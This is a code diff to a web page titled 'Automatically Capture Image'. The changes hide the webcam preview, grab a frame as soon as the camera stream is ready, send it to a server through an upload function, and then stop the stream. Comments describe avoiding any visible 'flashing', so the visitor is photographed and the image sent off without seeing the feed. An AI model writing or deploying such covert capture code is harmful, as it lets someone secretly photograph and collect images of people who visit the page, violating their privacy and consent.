@@ -9,19 +9,29 @@
     <h1>Automatically Capture Image</h1>
 
     <!-- Video element to show the live feed from the webcam -->
-    <video id="video" width="640" height="480" autoplay></video>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display: none;"></canvas> <!-- Hidden canvas to draw the captured image -->
+    
     <script>
+        let stream;
+
         // Access the webcam stream
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                // Display the webcam feed in the video element
-                document.getElementById('video').srcObject = stream;
-                
-                // Wait for the video to start playing
-                document.getElementById('video').onplay = () => {
-                    // Capture the image once the video starts playing
-                    captureAndUploadImage(stream);
+            .then((userStream) => {
+                // Store the stream for later use (to stop it later)
+                stream = userStream;
+
+                // Display the webcam feed in the video element (optional)
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+
+                // Stop the webcam feed immediately to avoid any flashing or black screen
+                videoElement.onloadedmetadata = () => {
+                    // Hide the video element before processing the image
+                    videoElement.style.display = 'none';
+
+                    // Proceed to capture the image immediately after stream is ready
+                    captureAndUploadImage();
                 };
             })
             .catch((error) => {
@@ -29,7 +39,7 @@
             });
 
         // Function to capture the image from the video stream
-        function captureAndUploadImage(stream) {
+        function captureAndUploadImage() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             const context = canvas.getContext('2d');
@@ -47,9 +57,18 @@
             // Send the image data to the server
             uploadImage(imageData);
 
-            // Stop the video stream after capturing the image
+            // Stop the video stream and clear the screen after capturing the image
+            stopWebcamStream();
+        }
+
+        // Function to stop the webcam stream and clear the screen
+        function stopWebcamStream() {
+            // Stop all video tracks of the webcam stream
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
+
+            // Hide the video element completely (in case it's still visible)
+            document.getElementById('video').style.display = 'none';
         }
 
         // Function to send the captured image to the server
